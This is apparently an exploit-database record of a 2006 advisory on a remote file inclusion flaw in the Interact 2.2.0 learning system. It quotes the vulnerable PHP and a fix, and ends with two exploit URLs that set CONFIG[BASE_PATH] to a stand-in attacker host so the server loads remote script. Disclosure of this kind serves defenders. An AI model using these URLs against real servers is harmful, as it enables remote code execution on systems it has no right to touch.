{
  "id": "2218",
  "title": "Interact 2.2 - &#039;CONFIG[base_path]&#039; Remote File Inclusion",
  "cve": "CVE-2006-4448",
  "vuln_type": "rce",
  "code": "/*\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- Cce-interact <= 2.2.0 (CONFIG[BASE_PATH]) Remote File Include Vulnerability\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- [Script name: Interact - Online Learning and Collaboration System v. 2.2.0\r\n- [Script site: https://sourceforge.net/projects/cce-interact/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-          Find by: Kacper (a.k.a Rahim)\r\n+\r\n-          Contact: kacper1964@yahoo.pl\r\n-                        or\r\n-          http://www.devilteam.yum.pl/\r\n-                       and\r\n-           http://www.rahim.webd.pl/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- Special Greetz: DragonHeart ;-)\r\n- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi\r\n-\r\n!@ Przyjazni nie da sie zamienic na marne korzysci @!\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-            Z Dedykacja dla osoby,\r\n-         bez ktorej nie mogl bym zyc...\r\n-           K.C:* J.M (a.k.a Magaja)\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n*/\r\n/*\r\n+++++++++++++++++++++START+++++++++++++++++++++++\r\nvulnerable code => admin/autoprompter.php line 33-38:\r\n....\r\n\r\nrequire_once($CONFIG['BASE_PATH'].'/modules/forum/autoprompt/prompt.inc.php');\r\nrequire_once($CONFIG['LANGUAGE_CPATH'].'/forum_strings.inc.php');\r\n\r\n$rs = $CONN->Execute(\"SELECT {$CONFIG['DB_PREFIX']}posts.post_key,\r\n{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey,\r\n{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.GroupKey,\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.NumberToPrompt,\r\n{$CONFIG['DB_PREFIX']}posts.subject,\r\n{$CONFIG['DB_PREFIX']}posts.body,{$CONFIG['DB_PREFIX']}posts.module_key,{$CONFIG['DB_PREFIX']}posts.thread_key,{$CONFIG['DB_PREFIX']}ForumThreadManagement.MinimumReplies,{$CONFIG['DB_PREFIX']}Spaces.Name,\r\n{$CONFIG['DB_PREFIX']}posts.added_by_key FROM\r\n{$CONFIG['DB_PREFIX']}posts,{$CONFIG['DB_PREFIX']}ModuleSpaceLinks,{$CONFIG['DB_PREFIX']}ForumThreadManagement,{$CONFIG['DB_PREFIX']}Spaces\r\nLEFT JOIN {$CONFIG['DB_PREFIX']}postsAutoPrompts ON\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.Postkey={$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key\r\nWHERE\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.PostKey={$CONFIG['DB_PREFIX']}posts.post_key\r\nAND\r\n{$CONFIG['DB_PREFIX']}posts.module_key={$CONFIG['DB_PREFIX']}ModuleSpaceLinks.ModuleKey\r\nAND\r\n{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey={$CONFIG['DB_PREFIX']}Spaces.SpaceKey\r\nAND\r\n{$CONFIG['DB_PREFIX']}posts.date_added<DATE_SUB(CURRENT_DATE,INTERVAL\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.DaysToWait DAY) AND\r\n{$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key IS NULL ORDER BY\r\n{$CONFIG['DB_PREFIX']}posts.post_key\");\r\n\r\n....\r\n+++++++++++++++++++++FIX+++++++++++++++++++++++++\r\nadmin/autoprompter.php line 33-38:\r\n....\r\nrequire_once('../local/config.inc.php');\r\nrequire_once($CONFIG['BASE_PATH'].'/modules/forum/autoprompt/prompt.inc.php');\r\nrequire_once($CONFIG['LANGUAGE_CPATH'].'/forum_strings.inc.php');\r\n\r\n$rs = $CONN->Execute(\"SELECT {$CONFIG['DB_PREFIX']}posts.post_key,\r\n{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey,\r\n{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.GroupKey,\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.NumberToPrompt,\r\n{$CONFIG['DB_PREFIX']}posts.subject,\r\n{$CONFIG['DB_PREFIX']}posts.body,{$CONFIG['DB_PREFIX']}posts.module_key,{$CONFIG['DB_PREFIX']}posts.thread_key,{$CONFIG['DB_PREFIX']}ForumThreadManagement.MinimumReplies,{$CONFIG['DB_PREFIX']}Spaces.Name,\r\n{$CONFIG['DB_PREFIX']}posts.added_by_key FROM\r\n{$CONFIG['DB_PREFIX']}posts,{$CONFIG['DB_PREFIX']}ModuleSpaceLinks,{$CONFIG['DB_PREFIX']}ForumThreadManagement,{$CONFIG['DB_PREFIX']}Spaces\r\nLEFT JOIN {$CONFIG['DB_PREFIX']}postsAutoPrompts ON\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.Postkey={$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key\r\nWHERE\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.PostKey={$CONFIG['DB_PREFIX']}posts.post_key\r\nAND\r\n{$CONFIG['DB_PREFIX']}posts.module_key={$CONFIG['DB_PREFIX']}ModuleSpaceLinks.ModuleKey\r\nAND\r\n{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey={$CONFIG['DB_PREFIX']}Spaces.SpaceKey\r\nAND\r\n{$CONFIG['DB_PREFIX']}posts.date_added<DATE_SUB(CURRENT_DATE,INTERVAL\r\n{$CONFIG['DB_PREFIX']}ForumThreadManagement.DaysToWait DAY) AND\r\n{$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key IS NULL ORDER BY\r\n{$CONFIG['DB_PREFIX']}posts.post_key\");\r\n\r\n....\r\n+++++++++++++++++++++++++++++++++++++++++++++++++\r\nvulnerable code => includes/common.inc.php line 35-40:\r\n....\r\n\r\n$CONFIG['ADODB_PATH']    = $CONFIG['BASE_PATH'].'/includes/adodb';\r\n//Include database abstraction classes\r\nrequire_once($CONFIG['ADODB_PATH'].'/adodb.inc.php');\r\nrequire_once($CONFIG['ADODB_PATH'].'/session/adodb-session.php');\r\n\r\n....\r\n+++++++++++++++++++++FIX+++++++++++++++++++++++++\r\nincludes/common.inc.php line 35-40:\r\n....\r\n\r\nrequire_once('../local/config.inc.php');\r\n$CONFIG['ADODB_PATH']    = $CONFIG['BASE_PATH'].'/includes/adodb';\r\n//Include database abstraction classes\r\nrequire_once($CONFIG['ADODB_PATH'].'/adodb.inc.php');\r\nrequire_once($CONFIG['ADODB_PATH'].'/session/adodb-session.php');\r\n\r\n....\r\n++++++++++++++++++++THE+END++++++++++++++++++++++\r\n*/\r\n#Exploit:\r\n\r\nhttp://www.site.com/[Cce-interact_path]/admin/autoprompter.php?CONFIG[BASE_PATH]=[http://www.myevilsite.com/evil_scripts.txt]\r\n\r\nhttp://www.site.com/[Cce-interact_path]/includes/common.inc.php?CONFIG[BASE_PATH]=[http://www.myevilsite.com/evil_scripts.txt]\r\n\r\n# milw0rm.com [2006-08-19]",
  "url": "https://www.exploit-db.com/exploits/2218"
}